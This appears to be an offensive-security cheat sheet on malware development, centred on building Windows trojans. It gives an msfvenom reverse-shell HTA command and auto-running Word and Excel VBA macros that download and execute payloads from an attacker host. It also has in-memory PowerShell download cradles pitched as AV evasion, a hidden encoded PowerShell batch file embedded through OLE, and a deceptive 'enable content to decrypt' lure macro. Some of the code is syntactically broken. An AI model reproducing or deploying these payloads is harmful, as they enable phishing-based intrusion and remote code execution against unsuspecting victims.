Malware Development:(MalDev)
===================
Basics:
	Note:
		Confusion between MalDev & AV Evasion:
			MalDev and AV Evasion go hand in hand and are two sides of same coin.
			MalDev is about creating the raw malware either by writing its whole code with hand, or using a tool like msfvenom. 
			Malware may not exploit in presence of EDR or AV. So, for that special techniques/tools are used to bypass the AV.
			Note:
				Read AV Evasion Sheet to read about AV Evasion.
	MalDev:
		MalDev refers to creating malware according to the needs of a scenario. These needs decided the characteristics of malware.
		Characteristics of Malware:
			1. Persistence
			2. Pillaging:(Data Exfilteration)
			3. Reverse Shell communication
			4. Encryption
			5. Cryptomining
	Note:
		Read Malware Basics Sheet to read malware basics.
Windows MalDev:
	Basics:
		PE:(Portable Executable)
			Read Windows Internals Sheet to read about PE.
		DLL:(Dynamic Link Library)
			Read Windows Internals Sheet to read about DLL.
	Writing Custom Malware:
Creating Torjans:
	Doubt:
		What about MacOS or Android or iOS or *nix victims?
	Basics:
		Terms:
			Weaponization:
				Embedding the payload into a file. We send this file to victim
				Example:
					Using Empire, we got malicous vba code => Payload
					Embedding that vba code into a word file => weaponization
					That malicous word file => Torjan
	Types:
		HTML Applications:(.hta)
			Basics:
				This attack vector only works against Internet Explorer and to some extent Microsoft Edge
				The purpose of HTML Applications is to allow arbitrary execution of applications directly from Internet Explorer, rather than downloading and manually running an executable. IE automatically executes .hta files using mshta.exe(Microsoft-signed binary) outside the browser bcoz of the security boundaries
			Exploitation:
				Using msfvenom:
					msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f hta-psh -o evil.hta
					This will create a powershell based hta file
					Disadvantages:	
						1. Detetction
						2. Only Powershell
				Using Empire:
					stgaer/windows/hta
					Payloads can be created in VBScript/JS/PS
				Using demiguise:(https://github.com/nccgroup/demiguise)
					Basics:
						It is used to generate .html files that contain encrypted HTA payload. It helps in avoiding detection
						When target visits the page, the key is fetched and the HTA is decrypted dynamically within the browser and pushed directly to the user
					Usage:
						python demiguise.py -k mykey -c "cmd.exe /k malc.exe" -p Outlook.Application -o output.hta
							Flags:
								-k => key
								-p => payload
								-c => command to run from HTA
								-o => output
								-l => list payloads
				Once a victim accesses this file using Internet Explorer, they will be presented with the popup dialog to open file or not, Selecting Open will prompt an additional dialog	because of the sandbox protection of IE aka Protected Mode (which is enabled by default), The victim can select Allow to permit the action, which will execute the JavaScript code and launch cmd.exe
		Malicious MS Office:
			Using VBA in Macros:
				Basics:
					In MS, Macros refers to a series of commands and instructions that are grouped together to accomplish a task programmatically written in VBA, which is a scripting language than can access both ActiveX objects and the Windows Script Host.
				Making MS-Word Torjan:
					Create/open a word file:(either .docm or .doc)
						View -> macro -> create
							Name of Macro => MyMacro
							Macros in: "Document(document)"
						Add Content:(vba)
							1. Storing payload on disk:
								A. Using Executable:
									Sub AutoOpen()
										MyMacro
									End Sub
									Sub Document_Open()
										MyMacro
									End Sub
									Sub MyMacro()
										Dim Str As String
										Str = powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')" #downloads
										Shell str, vbHide
										Dim exepath = ActiveDocument.Path + "\msfstaged.exe"
										wait(2)
										Shell exePath, vbHide #executes
									End Sub
									Sub Wait(n As Long)
										Dim t As Date
										t = Now
										Do
										DoEvents
										Loop Until Now >= DateAdd("s", n, t)
									End Sub	
							2. Storing Payload on Memory:(use this to evade AV)
								A. Using Powershell Script:
									Sub AutoOpen()
										MyMacro
									End Sub
									Sub Document_Open()
										MyMacro
									End Sub
									Sub MyMacro()
										Dim Str As String
										Str = powershell -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://ip/file.ps1')
									End Sub
									Note:
										Why is code for using .ps1 different from using .exe in VBA?
											Powershell has "IEX(New-Object Net.WebClient).DownloadString('location')" function.
											The DownloadString() function of IEX copies the raw contents of the file into memory and then IEX executes it
								B. 
						Explanation of content:(vba) => Read VBA for Pentesting Sheet
				Making MS-Excel Torjan:
					Create/open excel file (either .xls or .xslm)
						View -> macro -> create
							Name of Macro => MyMacro
							Macros in: "Document(document)"
						Add Content:(vba)
							1. Storing payload on disk:
								A. Using Executable:
									Sub AutoOpen()
										MyMacro
									End Sub
									Sub Document_Open()
										MyMacro
									End Sub
									Sub MyMacro()
										Dim Str As String
										Str = powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.120/msfstaged.exe', 'msfstaged.exe')" #download
										Shell str, vbHide
										Dim exepath = ActiveDocument.Path + "\msfstaged.exe"
										wait(2)
										Shell exePath, vbHide #executes
									End Sub
									Sub Wait(n As Long)
										Dim t As Date
										t = Now
										Do
										DoEvents
										Loop Until Now >= DateAdd("s", n, t)
									End Sub	
							2. Storing Payload on Memory:(Use this to evade AV)
								A. Using Powershell Script:
									Sub AutoOpen()
										MyMacro
									End Sub
									Sub Workbook_Open()
										MyMacro
									End Sub
									Sub MyMacro()
										Dim Str As String
										Str = powershell -Exec Bypass IEX(New-Object Net.WebClient).DownloadString('http://ip/file.ps1')
									End Sub
									Explanation of content:(vba) => Read VBA for Pentesting Sheet
				Making MS-PowerPoint Torjan:
				Issues:
					1. Enable Content Warning:
						Microsoft has added security, so, the victim needs to ENABLE macros for our exploit to work.
					2. Protected View Warning:
						Protected View disables macros and images in word/excel file which are downloaded from internet.
						The victim needs to enable "editing" to execute the macro
			Object Linking and Embedding:(.bat)
				Office has a vuln, Dynamic Data Exchange (DDE), it was patched in 2017. However, we can still leverage Object Linking and Embedding (OLE) to abuse Microsoft Officeâ€™s document-embedding feature.
				we are going to embed a Windows batch file(launch.bat) inside a Microsoft Word document.
				launch.bat:
					START powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBj....
				Go to word file:
					Insert -> object -> create from file -> select launch.bat
					We can also change the appearance of the batch file within the Word document to make it look more benign. To do this, we simply check the Display as icon check box and choose Change Icon, which brings up the menu box, allowing us to make changes.
					This, will embed the file into word document and the client will need to double click to open this file.
			Uncategroized:
				MS Office:
					When using Microsoft Office in a phishing attack, an attacker will typically present a document, state that the document is encrypted or protected, and suggest that the user must Enable Editing and Enable Content to properly view the document.
				Enable RSA Deception Trick:
					Overview:
						We add a macro and decetp
					Malc.doc:
						Create a new doc and add a document in it, example CV.
						Select Text -> Quick Parts -> Auto Texts -> Save selection to AutoText gallery:
							Name -> TheDoc
						Delete the CV text
						Add Torjan Macro as explained in Torjan section
						Add Deception Macro:
							Name -> Decryption
							Content:
								Sub Document_Open()
									SubstitutePage
								End Sub
								Sub AutoOpen()
									SubstitutePage
								End Sub
								Sub SubstitutePage()
									ActiveDocument.Content.Select
									Selection.Delete
									ActiveDocument.AttachedTemplate.AutoTextEntries("TheDoc").Insert
								Where:=Selection.Range, RichText:=True
								End Sub
						Add "Please Enable Content and Enable Editing to Decrypt RSA"
						Add a fake rsa key(base6 text)
						Add a RSA certified l
		Malicious PDF:
		Malicious Rar:
		Malicious Zip:




*Nix MalDev:
	Linux MalDev:
		Basics:
			Terms:
				ELF:(Executable and Linkable Format)(aka Extensible Linking Format)
					Basics:
						ELF is a file format for executable files, object code, shared libraries, and core dumps.
						Its like PE, but for linux.
		Linux Firewall:
			iptables:
	OSX MalDev:
		Basics:
			Terms:
				Mach-O:(Mach Object)
					Basics:
						Mach-O is a file format for executables, object code, shared libraries, dynamically-loaded code, and core dumps.
						Its like PE, but for OSX.
Mobile MalDev:
	iOS MalDev:
	Android MalDev:
		TheFatRat?